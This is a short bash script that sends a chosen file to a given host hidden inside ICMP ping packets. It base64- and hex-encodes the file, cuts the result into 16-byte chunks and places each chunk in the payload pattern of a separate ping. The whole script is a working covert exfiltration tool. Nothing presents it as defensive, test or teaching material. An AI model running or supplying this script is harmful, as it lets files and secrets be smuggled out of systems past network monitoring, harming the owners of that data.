#!/bin/bash

function usage() {
    echo "Usage: "$0" <host_to_send> <file_to_transfer> [<send n packet>]" 
    if [ -n "$1" ] ; then
	echo "Error: "$1"!"
    fi
    exit
}

function pad() {
    str=$1
    l=${#str}
    packet_size=$2
    char=$3
    
    if [ $l -lt $packet_size ] ; then
	m=$[$packet_size-$l]
	str=$str`seq 1 $m | xargs printf "$char%.0s"`
    fi
    
    echo $str
}

function send() {
    host=$1
    data=$2
    strlen=${#data}
    max_data_size=16
    i=0
    
    while [ $i -lt $strlen ] ; do
	echo $i
	str=${data:$i:$max_data_size}
	str=$(pad $str $max_data_size '0')
	i=$[$i+$max_data_size]
	ping $host -q -c 1 -p "$str" 1>/dev/null
	#ping $host -q -c 1 -W 1 -p "$str" 1>/dev/null
    done
}


if [ $# -lt 2 ] || [ $# -gt 3 ] ; then
    usage
fi

host=$1
file=$2
if ! [ -f $file ] ; then
    usage "file not found"
fi

sep="***"
data=$sep$(basename $file)$sep$(cat $file | base64 | tr -d [:space:])$sep
hexa=`echo $data | xxd -p | tr -d '\n'`

send $host $hexa
exit
